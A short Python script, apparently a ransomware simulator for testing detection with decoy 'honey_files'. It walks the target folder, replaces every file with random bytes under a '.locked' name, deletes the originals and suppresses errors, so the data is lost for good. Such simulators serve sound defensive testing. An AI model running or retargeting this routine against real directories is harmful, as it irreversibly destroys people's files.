import os
import random

TARGET_DIR = "honey_files"

def encrypt_file(path):
    try:
        with open(path, "rb") as f:
            data = f.read()

        # simulate encryption (random bytes)
        encrypted = bytearray(random.getrandbits(8) for _ in range(len(data)))

        new_path = path + ".locked"

        with open(new_path, "wb") as f:
            f.write(encrypted)

        os.remove(path)

        print("Encrypted:", new_path)

    except:
        pass


for root, dirs, files in os.walk(TARGET_DIR):
    for file in files:
        path = os.path.join(root, file)
        encrypt_file(path)